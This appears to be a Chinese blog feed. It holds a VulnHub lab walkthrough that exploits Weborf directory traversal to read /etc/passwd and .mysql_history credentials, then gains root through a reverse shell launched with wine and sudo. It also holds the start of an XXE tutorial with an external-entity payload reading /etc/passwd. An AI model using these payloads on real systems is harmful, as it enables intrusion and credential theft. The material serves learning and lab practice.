class="name">td</span>&gt;</span><span class="tag">&lt;<span class="name">td</span>&gt;</span>Size<span class="tag">&lt;/<span class="name">td</span>&gt;</span><span class="tag">&lt;/<span class="name">tr</span>&gt;</span></span><br><span class="line">SF:<span class="tag">&lt;<span class="name">tr\x20style=\"background-color:\x20#DFDFDF;\"</span>&gt;</span><span class="tag">&lt;<span class="name">td</span>&gt;</span>d<span class="tag">&lt;/<span class="name">td</span>&gt;</span><span class="tag">&lt;<span class="name">td</span>&gt;</span><span class="tag">&lt;<span class="name">a\x20href</span></span></span><br><span class="line"><span class="tag"><span class="attr">SF:</span>=<span class="string">\</span>"<span class="attr">html</span>/\"&gt;</span>html/<span class="tag">&lt;/<span class="name">a</span>&gt;</span><span class="tag">&lt;/<span class="name">td</span>&gt;</span><span class="tag">&lt;<span class="name">td</span>&gt;</span>-<span class="tag">&lt;/<span class="name">td</span>&gt;</span><span class="tag">&lt;/<span class="name">tr</span>&gt;</span>\n<span class="tag">&lt;/<span class="name">table</span>&gt;</span><span class="tag">&lt;<span class="name">p</span>&gt;</span>Generated\x20by\x2</span><br><span class="line">SF:0Weborf/0\.12\.2\x20\(GNU/Linux\)<span class="tag">&lt;/<span class="name">p</span>&gt;</span><span class="tag">&lt;/<span class="name">body</span>&gt;</span><span class="tag">&lt;/<span class="name">html</span>&gt;</span>")%r(HTTPOptions,B2,</span><br><span class="line">SF:"HTTP/1\.1\x20200\r\nServer:\x20Weborf\x20\(GNU/Linux\)\r\nAllow:\x20GE</span><br><span class="line">SF:T,POST,PUT,DELETE,OPTIONS,PROPFIND,MKCOL,COPY,MOVE\r\nDAV:\x201,2\r\nDA</span><br><span class="line">SF:V:\x20<span class="tag">&lt;<span class="name">http:</span>//<span class="attr">apache</span>\<span class="attr">.org</span>/<span class="attr">dav</span>/<span class="attr">propset</span>/<span class="attr">fs</span>/<span class="attr">1</span>&gt;</span>\r\nMS-Author-Via:\x20DAV\r\</span><br><span class="line">SF:n\r\n")%r(RTSPRequest,B2,"HTTP/1\.1\x20200\r\nServer:\x20Weborf\x20\(GN</span><br><span class="line">SF:U/Linux\)\r\nAllow:\x20GET,POST,PUT,DELETE,OPTIONS,PROPFIND,MKCOL,COPY,</span><br><span class="line">SF:MOVE\r\nDAV:\x201,2\r\nDAV:\x20<span class="tag">&lt;<span class="name">http:</span>//<span class="attr">apache</span>\<span class="attr">.org</span>/<span class="attr">dav</span>/<span class="attr">propset</span>/<span class="attr">fs</span>/<span class="attr">1</span>&gt;</span>\r\</span><br><span class="line">SF:nMS-Author-Via:\x20DAV\r\n\r\n")%r(FourOhFourRequest,12B,"HTTP/1\.1\x20</span><br><span class="line">SF:404\x20Page\x20not\x20found:\x20Weborf\x20\(GNU/Linux\)\r\nContent-Leng</span><br><span class="line">SF:th:\x20202\r\nContent-Type:\x20text/html\r\n\r\n<span class="meta">&lt;!DOCTYPE\x20HTML\x20PU</span></span><br><span class="line"><span class="meta">SF:BLIC\x20\"-//W3C//DTD\x20HTML\x204\.01\x20Transitional//EN\"&gt;</span><span class="tag">&lt;<span class="name">html</span>&gt;</span><span class="tag">&lt;<span class="name">hea</span></span></span><br><span class="line"><span class="tag"><span class="attr">SF:d</span>&gt;</span><span class="tag">&lt;<span class="name">title</span>&gt;</span>Weborf<span class="tag">&lt;/<span class="name">title</span>&gt;</span><span class="tag">&lt;/<span class="name">head</span>&gt;</span><span class="tag">&lt;<span class="name">body</span>&gt;</span>\x20<span class="tag">&lt;<span class="name">H1</span>&gt;</span>Error\x20404<span class="tag">&lt;/<span class="name">H1</span>&gt;</span>Page\x20no</span><br><span class="line">SF:t\x20found\x20<span class="tag">&lt;<span class="name">p</span>&gt;</span>Generated\x20by\x20Weborf/0\.12\.2\x20\(GNU/Linux\)<span class="tag">&lt;/<span class="name">p</span></span></span><br><span class="line"><span class="tag"><span class="attr">SF:</span>&gt;</span><span class="tag">&lt;/<span class="name">body</span>&gt;</span><span class="tag">&lt;/<span class="name">html</span>&gt;</span>")%r(Socks5,125,"HTTP/1\.1\x20400\x20Bad\x20request:\x20</span><br><span class="line">SF:Weborf\x20\(GNU/Linux\)\r\nContent-Length:\x20199\r\nContent-Type:\x20t</span><br><span class="line">SF:ext/html\r\n\r\n<span class="meta">&lt;!DOCTYPE\x20HTML\x20PUBLIC\x20\"-//W3C//DTD\x20HTML\x2</span></span><br><span class="line"><span class="meta">SF:04\.01\x20Transitional//EN\"&gt;</span><span class="tag">&lt;<span class="name">html</span>&gt;</span><span class="tag">&lt;<span class="name">head</span>&gt;</span><span class="tag">&lt;<span class="name">title</span>&gt;</span>Weborf<span class="tag">&lt;/<span class="name">title</span>&gt;</span><span class="tag">&lt;/<span class="name">head</span>&gt;</span><span class="tag">&lt;<span class="name">b</span></span></span><br><span class="line"><span class="tag"><span class="attr">SF:ody</span>&gt;</span>\x20<span class="tag">&lt;<span class="name">H1</span>&gt;</span>Error\x20400<span class="tag">&lt;/<span class="name">H1</span>&gt;</span>Bad\x20request\x20<span class="tag">&lt;<span class="name">p</span>&gt;</span>Generated\x20by\x20We</span><br><span class="line">SF:borf/0\.12\.2\x20\(GNU/Linux\)<span class="tag">&lt;/<span class="name">p</span>&gt;</span><span class="tag">&lt;/<span class="name">body</span>&gt;</span><span class="tag">&lt;/<span class="name">html</span>&gt;</span>")%r(SIPOptions,B2,"HTT</span><br><span class="line">SF:P/1\.1\x20200\r\nServer:\x20Weborf\x20\(GNU/Linux\)\r\nAllow:\x20GET,PO</span><br><span class="line">SF:ST,PUT,DELETE,OPTIONS,PROPFIND,MKCOL,COPY,MOVE\r\nDAV:\x201,2\r\nDAV:\x</span><br><span class="line">SF:20<span class="tag">&lt;<span class="name">http:</span>//<span class="attr">apache</span>\<span class="attr">.org</span>/<span class="attr">dav</span>/<span class="attr">propset</span>/<span class="attr">fs</span>/<span class="attr">1</span>&gt;</span>\r\nMS-Author-Via:\x20DAV\r\n\r\</span><br><span class="line">SF:n");</span><br><span class="line">MAC Address: 00:0C:29:22:ED:7F (VMware)</span><br><span class="line">Device type: general purpose</span><br><span class="line">Running: Linux 3.X|4.X</span><br><span class="line">OS CPE: cpe:/o:linux:linux_kernel:3 cpe:/o:linux:linux_kernel:4</span><br><span class="line">OS details: Linux 3.2 - 4.9</span><br><span class="line">Network Distance: 1 hop</span><br><span class="line">Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel</span><br><span class="line"></span><br><span class="line">TRACEROUTE</span><br><span class="line">HOP RTT     ADDRESS</span><br><span class="line">1   0.11 ms 172.16.123.109</span><br><span class="line"></span><br><span class="line">OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .</span><br><span class="line">Nmap done: 1 IP address (1 host up) scanned in 142.97 seconds</span><br></pre></td></tr></table></figure><p><strong>开放的端口:</strong></p><p>​22/tcp ssh openssh 7.9</p><p>​80/tcp http apache</p><p>​3306/tcp mysql?</p><p>​8080/tcp http-proxy Weborf</p><p>80/tcp http</p><p><img src="%E6%8D%95%E8%8E%B7.png" alt="捕获"></p><p><img src="%E6%8D%95%E8%8E%B71.png" alt="捕获1"></p><p>没有任何东西</p><p>mysql连不上</p><p>看向 8080端口</p><p><img src="%E6%8D%95%E8%8E%B72.PNG" alt="捕获2"></p><p>看了看版本</p><p>用searchsploit搜索一下看看有没有漏洞存在</p><p><img src="%E6%8D%95%E8%8E%B73.PNG" alt="捕获3"></p><p>存在目录穿梭</p><p>看了看具体payload:</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">GET /..%2f..%2f..%2f..%2fetc%2fpasswd</span><br></pre></td></tr></table></figure><p>就是把 / 转成 html编码 %2f</p><p><img src="%E6%8D%95%E8%8E%B74.PNG" alt="捕获4"></p><p>成功。</p><p>目录穿梭最主要的就是找 敏感文件信息.</p><p>看看有没有<strong>敏感文件</strong>尤其是 历史记录那些，配置文件等</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">GET /..%2f..%2f..%2fhome%2f</span><br></pre></td></tr></table></figure><p><img src="%E6%8D%95%E8%8E%B75.PNG" alt="捕获5"></p><p>home下存在两个用户,两个用户下存在的文件：</p><ul><li><p>sunrise</p><p>|_user.txt</p></li><li><p>weborf</p><p>|_weborf源码</p></li></ul><p><strong>注意！这里是短路的路口，user.txt 是一个坑。重点不在这里</strong></p><p>想到端口开放了mysql，于是就百度了一下 mysql的敏感文件</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br></pre></td><td class="code"><pre><span class="line">/usr/local/app/apache2/conf/httpd.conf #apache2缺省配置文件  </span><br><span class="line">/usr/local/apache2/conf/httpd.conf  </span><br><span class="line">/usr/local/app/apache2/conf/extra/httpd-vhosts.conf #虚拟网站设置  </span><br><span class="line">/usr/local/app/php5/lib/php.ini #PHP相关设置 </span><br><span class="line">/etc/sysconfig/iptables #从中得到防火墙规则策略  </span><br><span class="line">/etc/httpd/conf/httpd.conf #apache配置文件  </span><br><span class="line">/etc/rsyncd.conf #同步程序配置文件  </span><br><span class="line">/etc/my.cnf #mysql的配置文件  </span><br><span class="line">/etc/redhat-release #系统版本  </span><br><span class="line">/etc/issue  </span><br><span class="line">/etc/issue.net</span><br><span class="line"></span><br><span class="line">etc/passwd #存储操作系统用户信息,该文件为所有用户可见</span><br><span class="line">用户名: 密码 : uid  : gid :用户描述：主目录：登陆shell</span><br><span class="line">密码：x表示暗文,相反为明文</span><br><span class="line"></span><br><span class="line">uid：userid,”0”为root ID.1-99为系统保留,分配给系统预定义帐号。Linux用户可以分为3类：超级用户（root）、管理用户和普通用户</span><br><span class="line"> </span><br><span class="line">　　伪用户（psuedo users）</span><br><span class="line">　　　　bin #拥有可执行的用户命令文件</span><br><span class="line">　　　　sys #拥有系统文件</span><br><span class="line">　　　　adm #拥有账户文件</span><br><span class="line">　　　　uucp #UUCP使用</span><br><span class="line">　　　　Ip #Ip或lpd子系统使用</span><br><span class="line">　　　　nobody #NFS使用</span><br><span class="line">　　　　audit</span><br><span class="line">　　　　cron</span><br><span class="line">　　　　mail</span><br><span class="line">　　　　usenet</span><br><span class="line"></span><br><span class="line">gid:字段记录的是用户所属的用户组。对应着/etc/group文件中的一条记录</span><br><span class="line">　用户描述：字段记录着用户的一些个人情况，例如用户的真实姓名、电话、地址等</span><br><span class="line">　　</span><br><span class="line">  主目录：用户的起始工作目录</span><br><span class="line">　</span><br><span class="line">  登陆shell：</span><br><span class="line">　　　　　　常用shell - sh(BourneShell),csh(CShell),ksh(KornShell),tcsh(TENEX/TOPS-20typeCShell),bash(BourneAgainShell)</span><br><span class="line">　　　　　　/bin/sh #默认登录Shell   /sbin/nologin #代表用户不能登录</span><br><span class="line"> </span><br><span class="line">/etc/shadow</span><br><span class="line">username: passwd: lastchg: min: max: warn: inactive: expire: flag</span><br><span class="line">登录名:加密口令:最后一次修改时间:最小时间间隔:最大时间间隔:警告时间:不活动时间:失效时间:标志</span><br><span class="line">口令 - 加密后的用户口令字，13个字符；如果为空/用户没有口令；如含有不属于集合&#123;./0-9A-Za-z&#125;中的字符/用户不能登录</span><br><span class="line"></span><br><span class="line">最后一次修改时间 - 表示的是从某个时刻起，到用户最后一次修改口令时的天数。时间起点对不同的系统可能不同</span><br><span class="line"></span><br><span class="line">最小时间间隔 - 两次修改口令之间所需的最小天数</span><br><span class="line"></span><br><span class="line">最大时间间隔 - 口令保持有效的最大天数</span><br><span class="line"></span><br><span class="line">警告时间  - 从系统开始警告用户到用户密码正式失效之间的天数</span><br><span class="line"></span><br><span class="line">不活动时间 - 用户没有登录活动但账号仍能保持有效的最大天数</span><br><span class="line"></span><br><span class="line">失效时间 - 账号的生存期。</span><br><span class="line"></span><br><span class="line">保留条目 - 无用字段</span><br><span class="line">/etc/group 存储有关本地用户组的信息</span><br><span class="line"></span><br><span class="line">一个组中可以有多个用户，一个用户也可以属于不同的组。当一个用户同时是多个组中的成员时，在/etc/passwd文件中记录的是登录时所属的默认组</span><br><span class="line"></span><br><span class="line">用户要访问属于附加组的文件时，必须首先使用newgrp命令使自己成为所要访问的组中的成员</span><br><span class="line"></span><br><span class="line">1）groupname GID #组名</span><br><span class="line">2）password #密码位置</span><br><span class="line">3）GID #组ID</span><br><span class="line">4）user #组成员</span><br><span class="line"></span><br><span class="line"> </span><br><span class="line">/usr/local/app/php5/lib/php.ini #PHP相关设置</span><br><span class="line">/usr/local/app/apache2/conf/extra/httpd-vhosts.conf #虚拟网站设置</span><br><span class="line">/etc/httpd/conf/httpd.conf或/usr/local/apche/conf/httpd.conf #linux APACHE虚拟主机配置文件</span><br><span class="line">/usr/local/resin-3.0.22/conf/resin.conf #3.0.22的RESIN配置文件</span><br><span class="line">/usr/local/resin-pro-3.0.22/conf/resin.conf /usr/local/app/apache2/conf/extra/httpd-vhosts.conf #APASHE虚拟主机</span><br><span class="line">/etc/httpd/conf/httpd.conf或/usr/local/apche/conf /httpd.conf #linux APACHE虚拟主机配置文件</span><br><span class="line">/usr/local/resin-3.0.22/conf/resin.conf #3.0.22的RESIN配置文件</span><br><span class="line">/usr/local/resin-pro-3.0.22/conf/resin.conf /usr/local/app/apache2/conf/extra/httpd-vhosts.conf #APASHE虚拟主机</span><br><span class="line">/etc/sysconfig/iptables #查看防火墙策略</span><br><span class="line">/root/.mysql_history、/root/.bash_history      #Mysql账号密码信息</span><br></pre></td></tr></table></figure><p>最后一个**.mysql_history** #mysql账号密码信息</p><p>这里写的是/root/用户，就猜想是否存在两个用户里面</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">GET /..%2f..%2f..%2fhome%2fweborf%2f.mysql_history</span><br></pre></td></tr></table></figure><p><img src="%E6%8D%95%E8%8E%B76.PNG" alt="捕获6"></p><p>找到 weborf 用户的密码。</p><p>使用ssh登入上去</p><p><img src="%E6%8D%95%E8%8E%B77.PNG" alt="捕获7"></p><p><strong>登入成功！！！</strong></p><p>到这一步就可以开始渗透提权了</p><h3 id="0x01-2-提权">0x01.2 提权</h3><p>发现用户的等级不是很高。打算来提权一下</p><p><img src="%E6%8D%95%E8%8E%B78.PNG" alt="捕获8"></p><p><strong>想到之前的mysql有半开放的状态。于是有个猜想。</strong></p><p><strong>是不是只允许本地登入mysql，测试了一下</strong></p><p><img src="%E6%8D%95%E8%8E%B79.PNG" alt="捕获9"></p><p>登入成功！</p><p>查询了一番数据库发现存在另一个用户的密码。</p><p><img src="%E6%8D%95%E8%8E%B710.PNG" alt="捕获10"></p><p>现在得到了 另一个用户的 密码。</p><p>现在切换用户</p><p><img src="%E6%8D%95%E8%8E%B711.PNG" alt="捕获11"></p><p>发现权限也不是特别高。不过算是进入了正常的用户了。</p><p>开始提权</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo su</span><br></pre></td></tr></table></figure><p>测试了一下，发现不行</p><p>在百思不得其解的时候。去问了问一些大佬。</p><p>有个大佬跟我说看看有没有 wine，可以用wine 建立反向连接。再用sudo -l 查一下该用户有那些权限</p><p><img src="%E6%8D%95%E8%8E%B713.PNG" alt="捕获13"></p><p>存在。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo -l#显示出自己（执行 sudo 的使用者）的权限</span><br></pre></td></tr></table></figure><p><img src="%E6%8D%95%E8%8E%B714.PNG" alt="捕获14"></p><p>scp 传了下msfveom windows 反向连接</p><p><img src="%E6%8D%95%E8%8E%B715.PNG" alt="捕获15"></p><p>scp muma.exe <a href="mailto:sunrise@172.16.123.109" target="_blank" rel="noopener">sunrise@172.16.123.109</a>:/home/sunrise/muma.exe</p><p><img src="%E6%8D%95%E8%8E%B716.PNG" alt="捕获16"></p><p>开始反弹。</p><p><img src="%E6%8D%95%E8%8E%B717-1576324766059.PNG" alt="捕获17"></p><h3 id="0x01-3-查看flag">0x01.3 查看flag</h3><p>试试是否能直接读取root.txt</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cat /root/root.txt</span><br></pre></td></tr></table></figure><p><img src="%E6%8D%95%E8%8E%B718.PNG" alt="捕获18"></p><p>成功！</p>]]></content>
      
      
      <categories>
          
          <category> Note </category>
          
          <category> vulnhub </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Note </tag>
            
            <tag> vulnhub </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>XXE漏洞学习</title>
      <link href="/2019/12/03/xxe/"/>
      <url>/2019/12/03/xxe/</url>
      
        <content type="html"><![CDATA[<h1 id="0x00-前言">0x00 前言</h1><p>最近看到挺多XXE漏洞的，于是打算来浅入学习下。</p><h1 id="0x01漏洞产生">0x01漏洞产生</h1><p>XXE漏洞全称XML External Entity Injection 即xml外部实体注入漏洞，XXE漏洞发生在应用程序解析XML输入时，<strong>没有禁止外部实体的加载</strong>，导致可加载恶意外部文件和代码，造成<strong>任意文件读取</strong>、<strong>命令执行</strong>、<strong>内网端口扫描</strong>、<strong>攻击内网网站</strong>、<strong>发起Dos攻击</strong>等危害。</p><p>XXE漏洞触发的点往往是可以上传xml文件的位置，没有对上传的xml文件进行过滤，导致可上传恶意xml文件。</p><h2 id="0x01-1-XML基础">0x01.1 XML基础</h2><p>要了解XXE漏洞，先要搞懂一定的基础知识，了解XML文档的基础组成。</p><p>XML 指可扩展标记语言（Extensible Markup Language）</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">XML 被设计用来传输和存储数据。</span><br><span class="line">HTML 被设计用来显示数据</span><br></pre></td></tr></table></figure><p>XML把数据从HTML分离，XML是独立于软件和硬件的信息传输工具。</p><p>XML语言没有预定义的标签，允许作者定义自己的标签和自己的文档结构</p><p>XML的语法规则：</p><ul><li><p>XML文档必须有一个根元素</p></li><li><p>XML元素都必须有一个关闭标签</p></li><li><p>XML标签对大小敏感</p></li><li><p>XML元素必须被正确的嵌套</p></li><li><p>XML属性值必须加引导</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version="1.0" encoding="UTF-8"?&gt;</span> <span class="comment">&lt;!--XML 声明--&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">girl</span> <span class="attr">age</span>=<span class="string">"18"</span>&gt;</span>　　<span class="comment">&lt;!--自定的根元素girl;age属性需要加引导--&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">hair</span>&gt;</span>长头发<span class="tag">&lt;/<span class="name">hair</span>&gt;</span>　　<span class="comment">&lt;!--自定义的4个子元素，即girl对象的属性--&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">eye</span>&gt;</span>大眼睛<span class="tag">&lt;/<span class="name">eye</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">face</span>&gt;</span>可爱的脸庞<span class="tag">&lt;/<span class="name">face</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">summary</span>&gt;</span>可爱美丽的女孩<span class="tag">&lt;/<span class="name">summary</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">girl</span>&gt;</span>　　<span class="comment">&lt;!--根元素的闭合--&gt;</span></span><br></pre></td></tr></table></figure></li></ul><h3 id="实体引用">实体引用</h3><p>在XML中，一些字符拥有特殊的意义。</p><p>如果把字符&quot;&lt;&quot;放在XML元素中，会发生错误，这是因为解释器会把它作为新元素的开始。</p><p><strong>例子:</strong></p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;message&gt;if salary &lt; 1000 then&lt;/message&gt;</span><br></pre></td></tr></table></figure><p>为了避免这个错误，请用<strong>实体引用</strong>来代替 “&lt;” 字符：</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">message</span>&gt;</span>if salary &amp;lt; 1000 then<span class="tag">&lt;/<span class="name">message</span>&gt;</span></span><br></pre></td></tr></table></figure><p>在 XML 中，有 5 个预定义的实体引用：</p><table><thead><tr><th>&amp;lt</th><th>&lt;</th><th>小于号</th></tr></thead><tbody><tr><td>&amp;gt</td><td>&gt;</td><td>大于号</td></tr><tr><td>&amp;amp</td><td>&amp;</td><td>和号</td></tr><tr><td>&amp;apos</td><td>’</td><td>单引号</td></tr><tr><td>&amp;quot</td><td>&quot;</td><td>引号</td></tr></tbody></table><p>DTD（文档类型定义）的作用是定义XML文档的合法构建模块</p><p>DTD 可被成行地声明于 XML 文档中，也可作为一个外部引用。</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">&lt;!--XML声明--&gt;</span></span><br><span class="line"><span class="meta">&lt;?xml version="1.0"?&gt;</span> </span><br><span class="line"><span class="comment">&lt;!--文档类型定义--&gt;</span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE note [  　　&lt;!--定义此文档是 note 类型的文档--&gt;</span></span><br><span class="line"><span class="meta">&lt;!ELEMENT note (to,from,heading,body)&gt;  &lt;!--定义note元素有四个元素--&gt;</span></span><br><span class="line"><span class="meta">&lt;!ELEMENT to (#PCDATA)&gt;     &lt;!--定义to元素为”#PCDATA”类型--&gt;</span></span><br><span class="line"><span class="meta">&lt;!ELEMENT from (#PCDATA)&gt;   &lt;!--定义from元素为”#PCDATA”类型--&gt;</span></span><br><span class="line"><span class="meta">&lt;!ELEMENT head (#PCDATA)&gt;   &lt;!--定义head元素为”#PCDATA”类型--&gt;</span></span><br><span class="line"><span class="meta">&lt;!ELEMENT body (#PCDATA)&gt;   &lt;!--定义body元素为”#PCDATA”类型--&gt;</span></span><br><span class="line"><span class="meta">]]]&gt;</span></span><br><span class="line"><span class="comment">&lt;!--文档元素--&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">note</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">to</span>&gt;</span>Dave<span class="tag">&lt;/<span class="name">to</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">from</span>&gt;</span>Tom<span class="tag">&lt;/<span class="name">from</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span>Reminder<span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span>You are a good man<span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">note</span>&gt;</span></span><br></pre></td></tr></table></figure><p>上述XML代码基本分为三个部分：</p><ul><li>第一部分是XML的声明；</li><li>第二部分是XML的DTD文档类型定义</li><li>第三部分是XML语句</li></ul><p>而外部实体攻击主要利用DTD的外部实体来进行注入的。</p><p>DTD有两种构建方式，分别为<strong>内部DTD声明</strong>和<strong>外部DTD声明</strong></p><blockquote><p>​tips: DTD = Document Type Definition 简称</p></blockquote><p><strong>内部DTD声明：</strong></p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE 根元素 [元素声明]&gt;</span></span><br></pre></td></tr></table></figure><p>实例：如上述代码</p><p><strong>外部DTD声明：</strong></p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE 根元素 SYSTEM "文件名"&gt;</span></span><br></pre></td></tr></table></figure><p>实例：</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version="1.0"?&gt;</span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE root-element SYSTEM "test.dtd"&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">note</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">to</span>&gt;</span>Y<span class="tag">&lt;/<span class="name">to</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">from</span>&gt;</span>K<span class="tag">&lt;/<span class="name">from</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span>J<span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span>ESHLkangi<span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">note</span>&gt;</span></span><br></pre></td></tr></table></figure><h1 id="0x02-XML简单用法">0x02 XML简单用法</h1><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">!ENTITY</span> 实体名称 "实体的值"&gt;</span></span><br></pre></td></tr></table></figure><p>外部实体:</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">!ENTITY</span> 实体名称 <span class="attr">SYSTEM</span> "<span class="attr">URI</span>"&gt;</span></span><br></pre></td></tr></table></figure><p>参数实体:</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">!ENTITY</span> % 实体名称 "实体的值"&gt;</span></span><br></pre></td></tr></table></figure><p>或者</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">!ENTITY</span> % 实体名称 <span class="attr">SYSTEM</span> "<span class="attr">URI</span>"&gt;</span></span><br></pre></td></tr></table></figure><p>实列演示:  除参数实体外实体+内部实体</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version="1.0" encoding="utf-8"?&gt;</span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE a[</span></span><br><span class="line"><span class="meta">&lt;!ENTITY name "nMask"&gt;]&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">foo</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">value</span>&gt;</span>&amp;name;<span class="tag">&lt;/<span class="name">value</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">foo</span>&gt;</span></span><br></pre></td></tr></table></figure><p>实列演示: 参数实体+外部实体</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version="1.0" encoding="utf-8"?&gt;</span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE a[</span></span><br><span class="line"><span class="meta">&lt;!ENTITY % name SYSTEM "file:///etc/passwd"&gt;</span></span><br><span class="line"><span class="meta">%name;</span></span><br><span class="line"><span 